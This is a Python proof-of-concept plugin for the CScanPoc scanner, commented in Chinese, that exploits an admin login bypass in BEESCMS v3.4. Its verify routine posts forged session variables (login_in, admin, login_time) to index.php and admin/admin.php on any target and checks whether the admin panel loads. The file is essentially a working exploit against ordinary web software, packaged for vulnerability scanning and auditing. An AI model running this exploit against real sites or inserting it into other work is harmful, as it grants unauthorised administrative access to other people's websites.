# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'BEESCMS_0001_p'  # 平台漏洞编号，留空
    name = 'BEESCMS /admin/admin.php 登录绕过'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-07-28'  # 漏洞公布时间
    desc = '''
        BEESCMS v3.4 /includes/fun.php 弱验证导致后台验证绕过漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=059180'  # 漏洞来源https://bugs.shuimugan.com/bug/view?bug_no=059180
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'BEESCMS'  # 漏洞应用名称
    product_version = '3.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b404e527-facb-48b8-a8c5-6923d36ce7ee'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            postdata = "_SESSION[login_in]=1&_SESSION[admin]=1&_SESSION[login_time]=300000000000000000000000\r\n"
            session = requests.Session()
            _req = session.post(self.target + "/index.php", data=postdata)
            # login test
            response = session.post(self.target+ "/admin/admin.php", data=postdata)
            content = response.text
            if "admin_form.php?action=form_list&nav=list_order" in content and "admin_main.php?nav=main" in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name,url=self.target+"/admin/admin.php"))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
